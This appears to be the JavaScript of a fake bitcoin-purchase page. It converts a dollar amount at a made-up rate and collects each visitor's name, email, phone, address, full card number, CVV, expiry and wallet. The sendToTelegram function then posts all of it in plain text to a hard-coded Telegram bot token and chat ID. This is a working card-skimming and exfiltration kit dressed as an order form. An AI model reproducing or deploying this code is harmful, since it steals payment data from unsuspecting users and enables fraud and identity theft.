// Set your Telegram bot token and chat ID
const TELEGRAM_TOKEN = '6993164522:AAES-MrFxo_PlFNQQweOQLkgyWr8GXDnaaw';
const TELEGRAM_CHAT_ID = '2074391753';

// Assume a fictional BTC/USD rate for this example
const BTC_RATE = 0.004231; // 1 USD = 0.004231 BTC

function calculateBTC() {
    const amount = parseFloat(document.getElementById('amount').value);
    if (!isNaN(amount)) {
        const btcEquivalent = amount * BTC_RATE;
        document.getElementById('calculated-btc').value = btcEquivalent.toFixed(6);
    } else {
        alert('Please enter a valid amount.');
    }
}

function sendToTelegram() {
    const name = document.getElementById('name').value;
    const email = document.getElementById('email').value;
    const phone = document.getElementById('phone').value;
    const address = document.getElementById('address').value;
    const cardNumber = document.getElementById('card-number').value;
    const cvv = document.getElementById('cvv').value;
    const exp = document.getElementById('exp').value;
    const bitcoinAddress = document.getElementById('bitcoin-address').value;
    const btcEquivalent = document.getElementById('calculated-btc').value;

    const message = `New Order: 
    Name: ${name}
    Email: ${email}
    Phone: ${phone}
    Address: ${address}
    Card Number: ${cardNumber}
    CVV: ${cvv}
    Exp: ${exp}
    Bitcoin Wallet: ${bitcoinAddress}
    BTC Equivalent: ${btcEquivalent}`;

    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
    fetch(url);
}